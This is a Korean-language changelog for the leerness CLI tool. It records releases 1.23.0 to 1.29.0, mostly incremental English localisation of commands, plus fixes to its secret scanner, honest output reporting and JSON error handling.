# Changelog

## 1.29.0 — 2026-06-16 — 🛡️ [안정화/Stable] drift auto-fix·진단 명령 영어화 안정 minor

**🛡️ 안정화(Stable) minor — drift 완전 영어화(버그수정 포함) + 진단 3종 영어화를 npm 공개.** 직전 minor(1.28.0) 이후 누적된 패치 2건(1.28.1 + 1.28.2)을 검증·통합해 배포. R-0011 정책의 20번째 stable minor. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.28.1~1.28.2)
- **🐛+🌐 drift --auto-fix 영어화 + 보안신호 판정 버그수정 (1.28.1)**: 1.27.2 가 보안 신호 라벨을 언어화하며 내부 `hasSecurityFired` 가 한국어 라벨 정규식에 결합돼 `--language en` 에서 보안 auto-fix 가 미발동하던 잠복 버그를 언어-안정 필드(`f.file`)로 수정. drift `--auto-fix` 진행 로그 ~21줄 영어화 → `drift check` 완전 영어(출력 + auto-fix).
- **🌐 진단 모듈 영어화 (1.28.2)**: `doctor`(설치/환경)·`which`(버전 충돌·npx 캐시)·`whats-new`(CHANGELOG 차분) 3종을 영어 opt-in. 기존 위임 가드 보존.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in. 한국어 출력/내부 호출 무영향(e2e 무회귀).

### 잔여 (UR-0010 백로그)
- capabilities/commands/constraints/install-safety 영어화 · init en seed 템플릿 i18n.

### 검증 (회귀 0)
- **selftest 250/250** · **E2E 368/368** (i18n 행위가드 lens/health/drift/doctor en/ko) · 게시본 클린룸 재실증.
- minor(1.29.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest).

## 1.28.2 — 2026-06-16 — CLI 영어화 Phase 10c: 진단 모듈(doctor/which/whats-new) 완전 영어화 (UR-0010)

**🌐 설치/버전 진단 3종을 영어로.** 문제 해결 시 자주 쓰는 진단 명령 `doctor`(설치/환경)·`which`(버전 충돌·npx 캐시)·`whats-new`(버전 변경 요약)를 한 모듈(lib/diagnostics.js)에서 완전 영어화.

### 변경 (UR-0010 Phase 10c)
- **lib/diagnostics.js 3 명령 영어화 (DI uiLang)**: doctor(설치/환경 진단·설치 경로·MCP 도구·selftest 통과/실패·셸·정상/문제), which(현재 실행·버전·npm 환경·글로벌 설치·PATH 후보·진단·강제 최신 방법), whats-new(버전 파악 실패/CHANGELOG 없음 에러·신규 명령·플래그·파일·버전별 헤드라인·권장 행동). `t(ko,en)`, ko 인자 verbatim.
- **3 DI 호출에 uiLang 주입**: doctorCmd/whichCmd(`_uiLang(arg('--path', cwd))`) + whatsNewCmd(`_uiLang(root)`). 기존 1.9.392/1.9.394 위임 가드 문자열 보존(selftest 무회귀).
- **한국어 기본 유지**: 영어는 명시 opt-in. ko/내부 호출 무영향.

### 잔여 (UR-0010 백로그)
- capabilities/commands/constraints/install-safety 영어화 · init en seed 템플릿 i18n.

### 검증 (회귀 0)
- **selftest 249→250** (진단 영어/한국어 보존 + uiLang 주입 소스가드) · 행위(doctor/which/whats-new `--language en` 한글 0 [Node 탐지] / ko 보존) · **E2E 368/368** (i18n 행위가드에 doctor en/ko 추가).
- patch(1.28.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.28.1 — 2026-06-16 — Phase 10b: drift --auto-fix 로그 영어화 + 보안신호 판정 버그 수정 (UR-0010)

**🐛+🌐 drift 를 완전 영어로 + 직전 라운드가 심은 버그 수정.** `drift check --auto-fix` 진행 로그를 영어화하면서, 1.27.2 가 보안 신호 라벨을 언어화하며 함께 심은 **내부 판정 버그**를 발견·수정.

### 변경
- **🐛 hasSecurityFired 언어-결합 버그 수정**: 1.27.2 에서 보안 신호 `label` 을 `t(ko,en)` 로 언어화했는데, 내부 `hasSecurityFired` 가 한국어 라벨 정규식(`/보안 위험 \(1\.9\.78\)/`)으로 매칭하고 있어 **`drift check --auto-fix --language en` 에서 보안 auto-fix 가 발동하지 않던** 잠복 버그. 언어-안정 필드(`f.file === '.env / .gitignore'`)로 매칭 변경 → en/ko 모두 정상 발동. (번역된 라벨에 내부 로직이 결합되면 안 된다는 교훈 — [[lesson-adversarial-harden-heuristic]] 의 'valueGroup' 류와 동일.)
- **🌐 drift --auto-fix 로그 영어화 (~21줄)**: 보안/인코딩/delivered/idempotency/release-cleanup/session-close 자동회복 진행 로그를 `t(ko,en)`. 이로써 `drift check` 가 **완전히** 영어 지원(출력 + auto-fix).
- **한국어 기본 유지**: 영어는 명시 opt-in. ko 로그/내부 호출 무영향.

### 검증 (회귀 0)
- **selftest 248→249** (afLog 영어/한국어 + 버그수정 소스가드) · 행위(보안 auto-fix en/ko 모두 발동 + en 로그 한글 0 [Node 탐지] + ko 보존) · **E2E 368/368**.
- patch(1.28.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.28.0 — 2026-06-15 — 🛡️ [안정화/Stable] 정직성 후속 + drift 영어화 안정 minor

**🛡️ 안정화(Stable) minor — 13번째 외부리뷰 정직성 수정 + drift 진단 영어화를 npm 공개.** 직전 minor(1.27.0) 이후 누적된 패치 2건(1.27.1 + 1.27.2)을 검증·통합해 배포. R-0011 정책의 19번째 stable minor. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.27.1~1.27.2)
- **🔎 정직성 후속 수정 (1.27.1)**: `audit <미초기화경로>` 가 "미초기화" 선언 후 없는 하네스에 design/reuse 체크를 보고하던 모순 출력 차단(요약/JSON 직행). `verify-claim --run-tests` 가 비-테스트 `--test-cmd`(exit 0, 미파싱)를 `✓ all passed` 로 거짓표기하던 것을 `✓ ran (exit 0) — test count unconfirmed` 로 정직 표기(판정/exit 불변 → FP=0).
- **🌐 drift check 출력 영어화 (1.27.2)**: `drift check` 기본 출력(경로/상태/신호 표/보안 신호/권장 조치)을 영어 opt-in. `--auto-fix` 진행 로그는 Phase 10b 백로그. 내부 호출(handoff/health)은 ko 기본이라 무영향.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in. 한국어 출력/내부 JSON 은 그대로(e2e 무회귀).

### 잔여 (백로그)
- drift `--auto-fix` 로그(Phase 10b) · capabilities/commands/doctor/install-safety/constraints 영어화 · init en seed 템플릿 i18n.

### 검증 (회귀 0)
- **selftest 248/248** · **E2E 368/368** (정직성 후속 가드 + i18n 행위가드 lens/health/drift en/ko) · 게시본 클린룸 재실증.
- minor(1.28.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest).

## 1.27.2 — 2026-06-15 — CLI 영어화 Phase 10: drift check 출력 영어화 (UR-0010)

**🌐 drift 진단 출력을 영어로.** 고빈도 진단 `drift check` 의 **기본 출력**(경로/상태/신호 표/보안 신호/권장 조치)을 영어 opt-in 으로. `--auto-fix` 진행 로그(~25줄)는 정직하게 Phase 10b 로 분리(반쪽 주장 회피).

### 변경 (UR-0010 Phase 10)
- **drift check 출력 영어화 (lib/drift.js, DI uiLang)**: 경로 없음 에러, 표 헤더(`신호/임계/가중치/발화`→`signal/threshold/weight/fired`), 신호 라벨 8종(`session close 누락`→`session close missing`, `current-state 갱신 없음`, `task update 없음`, `progress-tracker 비어있음`, `task-log 갱신 없음`, `보안 위험`→`security risk`, `Feature Graph 미정리`→`unlinked`, `task 0건 sub-app`), 보안 issue 2종, `권장 조치` 블록. `t(ko,en)`, ko 인자 verbatim.
- **내부 호출 무영향**: handoff/health 가 drift 를 내부 spawn(LEERNESS_INTERNAL, `--language` 없음)할 땐 ko 기본 라벨 — 한국어 출력/JSON 파싱 그대로(무회귀). 라벨은 `--json` 값도 언어 따름(en 시 영어).

### 잔여 (UR-0010 Phase 10b+, 백로그)
- drift `--auto-fix` 진행 로그(~25줄) + capabilities/commands/doctor/install-safety/constraints + init en seed 템플릿 i18n.

### 검증 (회귀 0)
- **selftest 247→248** (drift 영어/한국어 보존 + uiLang 주입 소스가드) · 행위(drift `--language en` 한글 0 / ko 보존 / 내부호출 ko 유지) · **E2E 368/368** (i18n 행위가드에 drift en/ko 추가).
- patch(1.27.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.27.1 — 2026-06-15 — 13번째 외부리뷰 정직성 후속: audit 미초기화 모순출력 + verify-claim no-parse 표기

**🔎 13번째 외부리뷰의 정직성 잔여 P2/P3 2건 수정(맹신 X 양방향 재현).** 둘 다 leerness 핵심 정체성(정직한 보고)을 직접 건드리는 출력 문제.

### 변경
- **audit 미초기화 경로 모순 출력 차단 (#2)**: `audit <미초기화경로>` 가 "미초기화" 를 선언한 직후 design/reuse 체크를 **없는 하네스에 대해** 보고하던 모순(예: "✓ no duplicate design guide candidates")을 차단 — 미초기화 감지 시 요약/JSON 으로 직행 후 종료. exit code(1)·`--json` 페이로드(not_initialized finding)는 종전과 동일, **정상 프로젝트 audit 은 무영향**(모든 체크 계속).
- **verify-claim --run-tests no-parse 정직 표기 (#3)**: 비-테스트 `--test-cmd`(예: `echo hi`)가 exit 0 이면서 테스트 비율을 못 파싱한 경우 `✓ all passed` 로 거짓표기하던 것을 `✓ ran (exit 0) — test count unconfirmed`(실행됨, 테스트 수 미확인)로 정직 표기. **메시지만 변경, 판정/exit 불변** → 출력 포맷이 다른 정상 테스트러너의 통과 주장을 거부하지 않음(FP=0). 진짜 N/N 테스트는 계속 `✓ all passed`, 실패(exit≠0)는 계속 `✗ FAIL`.

### 검증 (회귀 0)
- **selftest 246→247** (소스가드; 기존 1.9.421 "audit body=lib" 가드와 자기참조 충돌을 코멘트 앵커로 회피 — [[lesson-selftest-self-reference-trap]] 적용) · 행위(맹신 X 양방향) · **E2E 367→368** (정직성 후속 회귀가드 1건).
- patch(1.27.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적). 잔여(init en seed=대형 템플릿 i18n, Phase 10 진단 영어화)는 백로그.

## 1.27.0 — 2026-06-15 — 🛡️ [안정화/Stable] 보안 수정 안정 minor (개인키 스캔 FN + placeholder FP)

**🛡️ 안정화(Stable) minor — 13번째 외부리뷰에서 확인된 보안 수정을 조기 npm 공개.** 직전 minor(1.26.0) 이후 1.26.1 패치 1건이지만, **보안 FN/FP(거짓 "보안 OK" + CI 파손)는 패치 누적을 기다리기보다 조기 공개가 합리적**이라 단독 minor 로 게시. R-0011 정책의 18번째 stable minor.

### 이번 minor 통합 (1.26.1)
- **🔒 개인키 파일 스캔 FN 차단**: `scan secrets` 가 `.pem`/`.key`/`.crt`/`.p8`/`.pfx` 등을 확장자 allow-list 누락으로 건너뛰어 **커밋된 개인키 미탐 + handoff 가 "보안 OK" 거짓보증**하던 문제 수정(basename 오버라이드). gitignore 된 키는 종전대로 info.
- **🔒 DB placeholder 오탐(FP) 차단**: `.env.example` 의 `user:password@`·`root:root` 등 교과서 placeholder 를 커밋 시크릿으로 오탐해 `gate`/CI 를 깨뜨리던 문제 수정(valueGroup + placeholder 마커). 진짜 고엔트로피 비밀번호는 계속 탐지(FN=0).
- **🔧 retro --json NaN 계약**: 비숫자 `--days` 가 plain text 를 `--json` 소비자에게 흘리던 문제 → 숫자 가드 + 클램프(failJson 구조화).

### 잔여 (외부리뷰 백로그)
- init `--language en` seed 데이터 i18n(= 전체 `.harness/` 템플릿 i18n 필요, 대형) · verify-claim `--test-cmd` no-parse 하드닝(FP 회귀 위험으로 신중) · audit 미초기화 출력 정합(cosmetic) · 진단명령 영어화 Phase 10.

### 검증 (회귀 0)
- **selftest 246/246** · **E2E 367/367** (개인키 스캔 FN차단 + placeholder FP차단/FN유지 + retro --json 행위 회귀가드 포함) · 게시본 클린룸 재실증.
- minor(1.27.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest).

## 1.26.1 — 2026-06-15 — 13번째 외부리뷰 P2 수정: 개인키파일 스캔 FN + DB placeholder FP + retro --json NaN

**🔎 13번째 외부 멀티모델 리뷰(1.26.0 게시본)에서 확인된 P2 3건 수정.** 3 에이전트 클린룸 리뷰 → 맹신 X 양방향 직접 재현으로 진짜만 채택 → 보안 2건 + --json 계약 1건 수정.

### 변경 (확인된 P2 3건)
- **🔒 개인키 파일 스캔 FN 차단 (보안)**: `scan secrets` 가 `.pem`/`.key`/`.crt`/`.p8`/`.pfx` 등 개인키·인증서 확장자를 스캔 allow-list 누락으로 건너뛰어 **커밋된 개인키를 미탐 + handoff 가 "보안 OK" 거짓보증**하던 문제 → basename 오버라이드(env-family 패턴 미러)로 강제 스캔. (gitignore 된 키는 종전대로 info 강등.)
- **🔒 DB placeholder 오탐(FP) 차단 (보안/CI)**: `.env.example` 의 `postgres://user:password@`·`root:root`·`yourpassword` 같은 교과서 placeholder 가 커밋 시크릿으로 오탐돼 `gate`/CI 를 깨뜨리던 문제 → DB URI 정규식에 비밀번호 capture group(`valueGroup`) 추가 + placeholder 마커(`root`/`admin`/`user`/`yourpassword` 등 전체-값 정확 일치)로 차단. **진짜 고엔트로피 비밀번호는 계속 탐지(FN=0)**.
- **🔧 retro --json NaN 크래시 (계약)**: `retro --days <비숫자>` 가 `new Date(Invalid)` throw 로 `--json` 소비자에게 plain text(`✗ Invalid time value`)를 흘리던 문제 → 숫자 가드 + 음수/오버플로 클램프(`failJson` 구조화, insights/round-history 와 일관).

### 검증 (회귀 0)
- **selftest 245→246** (소스가드) · 행위(맹신 X 양방향: 개인키 .key 탐지 + .crt 무오탐, placeholder 스킵 + 실비번 탐지, retro --json 구조화 + 정상동작) · **E2E 367/367** (신규 행위 회귀가드 1건).
- patch(1.26.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적). 잔여 리뷰 발견(audit 미초기화 출력 정합 P2, verify-claim --test-cmd no-parse 하드닝 P3, init en seed 데이터 i18n, 진단명령 영어화 Phase 10)은 백로그.

## 1.26.0 — 2026-06-15 — 🛡️ [안정화/Stable] i18n 행위가드 + health 진단 영어화 안정 minor

**🛡️ 안정화(Stable) minor — i18n 레이어 견고성 검증·가드 + health 진단 영어화를 npm 공개.** 직전 minor(1.25.0) 이후 누적된 패치 2건(1.25.1 + 1.25.2)을 검증·통합해 배포. R-0011 정책의 17번째 stable minor. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.25.1~1.25.2)
- **🔬 22번째 버그헌트(i18n 레이어) + 행위 e2e 회귀가드 (1.25.1)**: 8 phase 영어화 레이어를 통째 적대 검증 → 런타임 버그 0(맹신 X 양방향). uiLang 크래시안전·`--language` positional 무누출·`--language=en` 문법·`--json` 유효·flag>manifest 우선순위 확인. 소스가드만 있던 공백(1.23.0 과장 통과 원인)을 **행위 e2e 가드**로 보강.
- **🌐 health 진단 완전 영어화 (1.25.2)**: 고빈도 진단 `health` 를 렌더 라벨 + 능력 매트릭스 evidence(16종) + issues + summary 까지 완전 영어화(반쪽 번역 회피). `--language en` opt-in.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in. 한국어 출력/매트릭스는 한 글자도 안 바뀜(e2e 무회귀).

### 잔여 (UR-0010 Phase 10+, 백로그)
- capabilities/commands/drift check/install-safety/constraints/doctor + 메모리 CRUD 빈상태 + handoff 본문 — en-leak 우선순위순.

### 검증 (회귀 0)
- **selftest 245/245** · **E2E 366/366** (i18n 행위가드: lens/health en 한글 0 + ko 기본 보존 + positional 무누출 포함).
- minor(1.26.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest) + 게시본 클린룸 재실증.

## 1.25.2 — 2026-06-15 — CLI 영어화 Phase 9: health 진단 완전 영어화 (UR-0010)

**🌐 health 진단을 통째로 영어로.** en-leak 스캔 우선순위에서 고빈도 진단인 `health` 를 — 렌더 라벨만이 아니라 **능력 매트릭스 evidence·issues·요약까지 완전히** — 영어화. 반쪽 번역(1.23.0 과장)의 재발을 피하려 한 모듈(lib/health.js)의 모든 한국어를 한 번에 처리.

### 변경 (UR-0010 Phase 9)
- **health 완전 영어화 (lib/health.js, DI uiLang 주입)**: 렌더 라벨(`## 보안`→`## Security`, skills/usage/tasks, `6능력 매트릭스`→`6-capability matrix`, `자동 회복`→`auto-recover`) + **능력 매트릭스 evidence 16종**(웹/PC/멀티/REPL/MCP/LSP 각 점수대) + summary + 보안 issues 4종 + path-not-found 에러. `t(ko,en)` 분기, ko 인자 verbatim.
- **bin DI**: `healthCmd` 호출에 `uiLang: _uiLang(root)` 주입(session-close/health 동일 패턴).
- **한국어 기본 유지**: 영어는 명시 opt-in. `health`/`health --json` 기본은 한국어 그대로(e2e 무회귀). `--json` 값도 언어 따름(en 시 영어 evidence).

### 잔여 (UR-0010 Phase 10+, 백로그)
- capabilities(24)/commands(90)/drift check/install-safety/constraints/doctor + 메모리 CRUD 빈상태 메시지 + handoff 본문 — en-leak 우선순위순.

### 검증 (회귀 0)
- **selftest 244→245** (health 영어/한국어 보존 + uiLang 주입 소스가드) · 행위(health `--language en` 한글 0 / ko 16줄 보존 / en --json 유효) · **E2E 366/366** (i18n 행위가드에 health en/ko 추가).
- patch(1.25.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.25.1 — 2026-06-15 — 22번째 버그헌트(i18n 레이어 검증) + i18n 행위 e2e 회귀가드 (UR-0010)

**🔬 8 phase 영어화 레이어를 통째로 적대 검증.** uiLang/`_tx`/`_t` 머신을 cross-cutting 레이어로 한 번에 점검 — **런타임 버그 0** (맹신 X 양방향 확인). 다만 그동안 i18n 은 *소스가드(문자열 존재)* 만 있고 *행위 e2e* 가 없었는데, 이 공백이 1.23.0 "완전 영어" 과장(런타임 누출)을 통과시킨 근본 원인이었음 → 행위 회귀가드로 보강.

### 검증 결과 (런타임 버그 없음, 레이어 견고 확인)
- `_uiLang` 크래시 안전(try/catch + String 가드, malformed manifest/빈 값 → ko 폴백).
- arg 상호작용: `--language en` 값이 positional 로 누출 안 됨(앞/뒤 위치 모두), `task add "텍스트" --language en` 보존.
- `--language=en` equals 문법 동작, `--json` 출력 en 에서도 유효 JSON, flag > env > manifest 우선순위(en 프로젝트에서 `--language ko` 가 ko 강제).

### 변경 (defense-in-depth)
- **i18n 행위 e2e 회귀가드 1건 추가** (e2e 365→366): ① ko 프로젝트 기본 lens 한글 보존 ② `--language en` 런타임 영어 렌더 + 한글 0 ③ `--language` positional 무누출 ④ status path-not-found 에러 en/ko 분기. 소스가드가 못 잡는 *런타임 누출* 을 행위로 차단.

### 검증 (회귀 0)
- **selftest 244/244** · **E2E 366/366** (신규 i18n 행위가드 포함, ko 기본 무회귀).
- patch(1.25.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.25.0 — 2026-06-15 — 🛡️ [안정화/Stable] 마감 본문 정직성 + lens 플래그십 영어화 안정 minor

**🛡️ 안정화(Stable) minor — 자가 검증으로 잡은 정직성 수정 + 품질 렌즈 영어화를 npm 공개.** 직전 minor(1.24.0) 이후 누적된 패치 2건(1.24.1 + 1.24.2)을 검증·통합해 배포. R-0011 정책의 16번째 stable minor. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.24.1~1.24.2)
- **🔎 session close 보고 본문 정직성 수정 (1.24.1)**: 게시된 모든 영어 표면을 `--language en` 으로 실행해 한글 누출을 자동 스캔(맹신 X — 내 'CLOSED' 주장 재실증)한 결과, 1.23.0 "session close 완전 영어" 가 과장임을 발견 → 보고 본문 잔여 영어화(`- 없음`→`- none`, `완료/결정 누적`→`done/decisions accumulated`, roadmap `자동 갱신`→`auto-updated`).
- **🌐 lens 품질 렌즈 플래그십 영어화 (1.24.2)**: 분야별 자기질문 품질 렌즈 5 도메인(code/design/docs/test/security)에 영어 병렬 카탈로그 추가 + `--language en` 렌더. 영어권 사용자도 완료 선언 전 자가 점검 + 분야간 인과를 활용.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in. 한국어 원문/렌즈 질문은 한 글자도 안 바뀜(e2e 무회귀).

### 잔여 (UR-0010 Phase 9+, 백로그)
- 진단/정보 명령 본문(health/capabilities/commands/doctor/drift/install-safety/constraints) + 메모리 CRUD 빈상태 메시지 + handoff 본문 + init starter 데이터 — en-leak 스캔 우선순위순 단계적 확대.

### 검증 (회귀 0)
- **selftest 244/244** (정직성 + lens 영어/한국어 보존 소스가드 포함) · 행위(en-leak 스캔: session close 본문·lens en 한글 0 / ko 보존) · **E2E 365/365**.
- minor(1.25.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest) + 게시본 클린룸 재실증.

## 1.24.2 — 2026-06-15 — CLI 영어화 Phase 8: lens(품질 렌즈 플래그십) 영어화 (UR-0010)

**🌐 품질 렌즈를 영어로.** 남은 한국어 표면을 en-leak 스캔으로 매핑한 뒤, 가장 가치 높은 플래그십 — **분야별 자기질문 품질 렌즈(`leerness lens`)** — 를 영어화. 영어권 사용자도 "완료 선언 전 자가 점검" + 분야간 인과관계를 그대로 활용할 수 있습니다.

### 변경 (UR-0010 Phase 8)
- **lens 영어 병렬 카탈로그**: `LENS_CATALOG` 5 도메인(code/design/docs/test/security)에 `titleEn`/`personaEn`/`questionsEn`/`affectsNoteEn` 추가. 한국어 원문(`questions`/`persona` 등)은 **한 글자도 안 바꿈** — selftest `userVerbatim` 가드 + e2e(ko) 안전.
- **lensCmd 영어 렌더**: `--language en` 시 헤더/부제/페르소나/질문/↔인과/푸터/unknown 에러 모두 영어. 프로젝트 커스텀 렌즈(.harness/quality-lenses.json)는 영어 필드가 없으면 작성된 텍스트로 graceful fallback, builtin 도메인에 추가한 커스텀 질문은 `questionsEn` 개수 기준으로 분리해 영어 렌더에 append.
- **한국어 기본 유지**: 영어는 명시 opt-in. 플래그 없으면 한국어 그대로(e2e 무회귀).

### 잔여 (UR-0010 Phase 9+, 백로그)
- 진단/정보 명령 본문(health/capabilities/commands/doctor/drift check/install-safety/constraints) + 메모리 CRUD 빈상태 메시지 + handoff 본문 + init starter 데이터 — en-leak 스캔 우선순위순 단계적 확대.

### 검증 (회귀 0)
- **selftest 243→244** (lens 영어 병렬필드 + ko verbatim + 렌더 영어 분기 소스가드) · 행위(en-leak 재스캔: `lens --language en` 한글 0 / ko 29줄 보존 / unknown 에러 en·ko) · **E2E 365/365**.
- patch(1.24.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.24.1 — 2026-06-15 — 정직성 수정: session close 보고 본문 잔여 한국어 영어화 (UR-0010)

**🔎 자가 검증으로 발견한 과장 주장 교정.** 게시된 모든 영어 표면을 `--language en` 으로 직접 실행해 한국어(가-힣) 누출을 스캔(맹신 X — 내 'CLOSED' 주장 재실증)한 결과: help/status/group help 는 깨끗했지만, **session close 보고 본문**은 1.23.0 에서 "완전 영어"로 배포했음에도 일부 한국어가 남아 있었습니다. 그 잔여를 영어화.

### 변경 (UR-0010)
- **session close 보고 본문 영어화**: 빈 섹션 표시 `- 없음`→`- none`(rowsToList, 헤더는 이미 영어라 정합↑), 진행 요약 한 줄 `완료 N/M · 결정 N건 누적`→`done N/M · decisions N accumulated`(`_retroOneLine` 에 선택적 lang), roadmap 자동 갱신 로그 `자동 갱신`→`auto-updated`(`_autoRoadmap`, `_uiLang(root)` 기반).
- **한국어 기본 불변**: 모든 변경은 en 분기에만. ko 는 한 글자도 안 바뀜(e2e 무회귀). `_retroOneLine` 의 기존 호출부(retro 명령)는 lang 미전달 → ko 유지.
- **검증 방법 공개**: en-leak 스캔(Node `[가-힣]` 탐지 — grep `\x{}` 빌드 한계 우회)으로 재실증. 남은 2줄은 seeded T-0001 + task-add 기본 next-action 값(데이터, Phase 8).

### 잔여 (UR-0010 Phase 8+, 백로그)
- handoff 본문 + 메모리 CRUD/진단 명령 본문(task/decision/audit/gate/scan 사람용 메시지) + init starter 콘텐츠/task-add 기본값 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 242→243** (보고 본문 영어/한국어 보존 소스가드) · 행위(en fresh: `- none / done 0/1 · decisions 0 accumulated / roadmap.html auto-updated`, ko fresh: `- 없음 / 완료 0/1 · 결정 0건 누적 / 자동 갱신`) · **E2E 365/365**.
- patch(1.24.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.24.0 — 2026-06-15 — 🛡️ [안정화/Stable] help 표면 전체 영어화 안정 minor

**🛡️ 안정화(Stable) minor — `leerness --help` 와 모든 도움말 표면을 영어로 공개.** 직전 minor(1.23.0) 이후 누적된 패치 2건(1.23.1 Phase 6 + 1.23.2 Phase 7)을 검증·통합해 npm 배포. R-0011 정책의 15번째 stable minor. 이제 영어 사용자가 **메인 도움말 → 명령군 그룹 도움말 → 사용법 힌트**까지 막힘없이 읽을 수 있습니다. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.23.1~1.23.2)
- **🌐 메인 help 영어 큐레이트판 (Phase 6)**: `--language en` 시 8개 카테고리(Setup·Diagnostics·Verification·Security·Handoff·Memory·Skills·Agents·Reuse·Release·More)로 정리된 영어 도움말. 레거시 버전태그 군더더기를 빼 영어 사용자가 읽기 쉬움. status 잔여(경로 없음/healthyMeaning) + subcommand_required 에러도 영어화.
- **🌐 그룹 help + 사용법 힌트 영어화 (Phase 7)**: requests/constraints/wakeup-interval/idempotency/intent 의 bare-command 도움말 + `_GROUP_USAGE` 자리표시자(`<text>`/`<trigger>`/`<key>`/`<name>`, 병렬 영어맵).
- **한국어 우선 기본 보존**: 영어는 명시 opt-in(`--language en`/`LEERNESS_LANG=en`/en init 프로젝트). 플래그 없으면 한국어 — 한국어 help/맵은 한 글자도 안 바뀜(e2e 무회귀로 검증).

### 잔여 (UR-0010 Phase 8+, 백로그)
- 메모리 CRUD/진단 명령 본문 출력(task/decision/audit/gate/scan 등 사람용 메시지) + session-handoff.md 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 242/242** (Phase 6·7 영어/한국어 보존 소스가드 포함) · 행위(en: `SETUP & UPDATE / 5 group headers / <key>`, ko 기본: `Usage: / 한국어 그룹 헤더 / <키>`) · **E2E 365/365**.
- minor(1.24.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest) + 게시본 클린룸 재실증.

## 1.23.2 — 2026-06-15 — CLI 영어화 Phase 7: group help 5종 + _GROUP_USAGE 자리표시자 영어화 (UR-0010)

**🌐 도움말 표면 패밀리 완성.** Phase 6(메인 `--help`)에 이어, 명령군을 하위명령 없이 부를 때 나오는 **그룹 도움말**과 **사용법 힌트의 자리표시자**까지 영어화 — 메인 help + group help + usage hint 가 모두 언어 선택을 따른다.

### 변경 (UR-0010 Phase 7)
- **group help 5종 영어화**: `requests` / `constraints` / `wakeup-interval` / `idempotency` / `intent` 를 하위명령 없이(또는 `help`) 부를 때의 도움말을 `_t(ko,en)` 분기.
- **_GROUP_USAGE 자리표시자 영어화**: `<텍스트>`→`<text>`, `<트리거>`→`<trigger>`, `<키>`→`<key>`, `<이름>`→`<name>` — `_GROUP_USAGE_EN` 병렬맵으로(한국어 맵은 한 글자도 안 바꿔 e2e 안전), subcommand_required 에러가 언어별 정확한 사용법 표시.
- **한국어 기본 유지**: 영어는 명시 opt-in. 플래그 없으면 기존 한국어 그대로(e2e 무회귀).

### 잔여 (UR-0010 Phase 8+, 백로그)
- 메모리 CRUD/진단 명령 본문 출력(task/decision/audit/gate/scan 등 사람용 메시지) + session-handoff.md 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 241→242** (group help 5종 영어+한국어 보존, _GROUP_USAGE_EN 존재 + ko 맵 불변 소스가드) · 행위(en: 5종 영어 헤더 + `<key>`/`<text>`, ko 기본: 5종 한국어 헤더 + `<키>`/`<텍스트>`) · **E2E 365/365**.
- patch(1.23.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.23.1 — 2026-06-15 — CLI 영어화 Phase 6: help(영어 큐레이트판) + status/subcommand 에러 영어화 (UR-0010)

**🌐 `leerness --help` 와 흔한 에러를 영어로.** 영어 사용자가 가장 먼저 보는 도움말을 — 레거시 버전태그를 줄별로 번역하는 대신 — **카테고리별로 정리한 별도 영어 도움말**로 제공. 한국어 도움말은 그대로 둬서 한국어 기본 경로는 한 글자도 안 바뀜.

### 변경 (UR-0010 Phase 6)
- **help 영어 큐레이트판 (`_helpEn`)**: `--language en`/`LEERNESS_LANG=en` 시 8개 카테고리(Setup·Diagnostics·Verification·Security·Handoff·Memory·Skills·Agents·Reuse·Release·More)로 정리된 영어 도움말. 전체 전수 목록은 `leerness commands` 안내(드리프트 방지).
- **status 잔여 영어화**: 경로 없음 에러(`path not found`), `--json` 의 `healthyMeaning`(`install-file presence only …`).
- **subcommand_required 에러 영어화**: 명령군(rule/skill/feature/memory)을 하위명령 없이 부를 때의 `subcommand required — usage: …`.
- **한국어 기본 유지**: 영어는 명시 opt-in. 플래그 없으면 기존 한국어 도움말/에러 그대로(e2e 무회귀).

### 잔여 (UR-0010 Phase 7+, 백로그)
- `_GROUP_USAGE` 내부 자리표시자(`<텍스트>`/`<트리거>`) + 명령별 하위 help 블록(group help) + session-handoff.md 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 240→241** (help 영어판 존재+핵심 카테고리 포함, ko help 분기 보존, status/subcommand 영어/한국어 소스가드) · 행위(en: `SETUP & UPDATE / path not found / subcommand required`, ko 기본: `Usage: / 경로 없음 / 하위명령 필요`) · **E2E 365/365**.
- patch(1.23.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.23.0 — 2026-06-15 — 🛡️ [안정화/Stable] session close 영어 완전화 안정 minor

**🛡️ 안정화(Stable) minor — 세션 마감 화면 전체를 영어로 공개.** 직전 minor(1.22.0) 이후 누적된 패치 2건(1.22.1 Phase 4 + 1.22.2 Phase 5)을 검증·통합해 npm 배포. R-0011 정책의 14번째 stable minor. 이로써 **핵심 세션 라이프사이클 — 설치(init) → 시작(handoff) → 검증(verify-claim) → 마감(session close) — 전체가 영어 opt-in 으로 일관**됩니다. 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.22.1~1.22.2)
